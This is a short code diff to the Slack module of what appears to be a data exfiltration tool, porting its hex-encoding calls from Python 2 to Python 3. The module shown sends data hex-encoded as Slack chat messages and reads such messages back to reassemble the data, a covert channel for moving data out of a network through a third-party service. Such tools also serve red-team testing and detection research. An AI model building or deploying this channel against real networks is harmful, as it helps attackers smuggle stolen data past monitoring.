@@ -10,7 +10,7 @@ def send(data):
     global sc
     chan = config['chan_id']
     app_exfiltrate.log_message('info', "[slack] Sending {} bytes with Slack".format(len(data)))
-    data = data.encode('hex')
+    data = (data.encode('utf-8') if isinstance(data, str) else data).hex()
 
     sc.api_call("api.text")
     sc.api_call("chat.postMessage", as_user="true:", channel=chan, text=data)
@@ -24,7 +24,7 @@ def listen():
                 raw_data = sc.rtm_read()[0]
                 if 'text' in raw_data:
                     app_exfiltrate.log_message('info', "[slack] Receiving {} bytes with Slack".format(len(raw_data['text'])))
-                    app_exfiltrate.retrieve_data(raw_data['text'].decode('hex'))
+                    app_exfiltrate.retrieve_data(bytes.fromhex(raw_data['text']))
             except:
                 pass
             time.sleep(1)
